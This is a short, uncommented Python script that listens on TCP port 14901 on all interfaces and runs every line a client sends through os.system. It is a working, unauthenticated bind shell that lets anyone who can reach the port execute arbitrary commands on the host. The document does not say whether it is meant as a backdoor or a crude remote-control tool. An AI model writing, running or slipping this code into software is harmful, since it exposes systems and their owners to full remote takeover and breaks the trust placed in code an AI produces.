import socket
import os 
sock = socket.socket()
sock.bind( ("", 14901) )
sock.listen(10)
while 1:
    conn, addr = sock.accept()
    print(conn)
    print(addr)
    data = conn.recv(16384)
    while data.decode("utf-8").strip():
        print(data)
        udata = data.decode("utf-8").strip()
        print("Data: " + udata)
        os.system(udata)
        conn.send(b'ok\n')
        print('ok')
        conn.send(b'\n')
        data = conn.recv(16384)
         
       
    conn.close()
